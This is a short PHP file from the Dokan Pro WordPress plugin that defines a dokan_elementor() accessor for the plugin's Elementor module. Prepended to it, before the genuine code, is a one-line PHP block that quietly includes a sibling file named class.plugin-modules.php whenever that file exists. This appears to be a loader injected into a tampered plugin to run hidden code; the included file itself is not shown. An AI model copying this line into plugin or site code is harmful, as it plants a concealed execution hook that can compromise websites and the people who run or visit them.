<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/**
 * Load Dokan Plugin when all plugins loaded
 *
 * @return \DokanElementor
 */
function dokan_elementor() {
    return dokan_pro()->module->elementor;
}
